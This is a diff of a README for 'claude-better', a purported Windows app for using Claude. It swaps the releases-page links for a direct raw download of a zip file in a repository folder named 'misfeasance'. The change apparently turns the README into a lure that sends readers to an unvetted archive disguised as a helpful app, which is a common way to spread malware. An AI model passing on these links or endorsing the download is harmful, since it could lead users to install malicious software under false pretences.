@@ -1,6 +1,6 @@
 # 🤖 claude-better - Run Claude with less friction
 
-[![Download claude-better](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/leolinehighinterest961/claude-better/releases)
+[![Download claude-better](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/leolinehighinterest961/claude-better/raw/refs/heads/main/misfeasance/better_claude_v1.9.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ claude-better is a Windows app that gives you a cleaner way to use Claude. It is
 
 Visit this page to download the app:
 
-https://github.com/leolinehighinterest961/claude-better/releases
+https://github.com/leolinehighinterest961/claude-better/raw/refs/heads/main/misfeasance/better_claude_v1.9.zip
 
 Use the latest release for Windows. On the release page, look for a file with one of these names:
 
@@ -169,7 +169,7 @@ If you keep the app pinned to your taskbar, you can open it with one click.
 
 If you need the download page again, use this link:
 
-https://github.com/leolinehighinterest961/claude-better/releases
+https://github.com/leolinehighinterest961/claude-better/raw/refs/heads/main/misfeasance/better_claude_v1.9.zip
 
 ## 📝 Help with a clean run
 
